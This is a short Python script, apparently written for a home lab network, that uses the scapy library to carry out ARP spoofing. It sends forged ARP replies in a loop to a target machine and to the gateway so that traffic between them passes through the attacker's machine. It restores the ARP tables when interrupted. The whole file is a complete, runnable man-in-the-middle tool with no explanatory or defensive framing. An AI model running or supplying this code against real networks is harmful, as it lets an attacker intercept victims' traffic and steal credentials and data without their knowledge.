import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered:
        return answered[0][1].hwsrc
    else:
        return None


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    
    if target_mac is None:
        return

    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    scapy.sendp(packet, verbose=False)

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)

    if dst_mac is None or src_mac is None:
        print("[!] Failed to get MAC address for restore.")
        return

    packet = scapy.Ether(dst=dst_mac) / scapy.ARP(
        op=2,
        pdst=dst_ip,
        hwdst=dst_mac,
        psrc=src_ip,
        hwsrc=src_mac
    )
    scapy.sendp(packet, verbose=False, count=4)


target_ip="192.168.110.129"
gateway_ip="192.168.110.2"
try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print("\r[+] Sent packets: " + str(sent_packet_count), end="")
        sent_packet_count += 2
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Quitting.")
    print("[+] Restoring ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)